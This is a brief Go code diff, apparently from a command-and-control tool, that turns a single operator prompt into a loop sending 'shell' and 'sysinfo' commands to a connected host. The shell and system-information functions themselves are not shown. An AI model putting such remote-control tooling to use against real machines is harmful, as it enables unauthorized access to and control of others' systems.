@@ -48,16 +48,19 @@ func sysinfo(conn net.Conn) {
 
 
 func handleConnection(conn net.Conn) {
-	fmt.Printf("[C3]: ")
-	reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
+	for {
+		fmt.Printf("[C3]: ")
+		reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
+		reader = strings.TrimSuffix(reader, "\n")
 
-	switch {
+		switch {
 		case reader == "shell":
 			shell(conn)
 		case reader == "sysinfo":
 			sysinfo(conn)
 		default:
 			fmt.Println("Invalid command")
+		}
 	}
 }
 
